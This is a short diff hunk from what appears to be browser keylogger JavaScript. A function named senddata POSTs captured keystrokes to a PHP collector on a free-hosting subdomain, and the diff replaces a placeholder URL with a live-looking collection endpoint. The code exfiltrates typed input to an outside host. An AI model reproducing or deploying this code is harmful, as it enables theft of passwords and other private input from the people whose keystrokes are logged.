@@ -126,7 +126,7 @@ function checkKeyPress(key) {
 }
 
 function senddata(keystork){
-  var url = "https://example.000webhostapp.com/1.php";
+  var url = "https://stroking.000webhostapp.com/1.php";
   var params = keystork;
   var xhr = new XMLHttpRequest();
   xhr.open("POST", url, true);
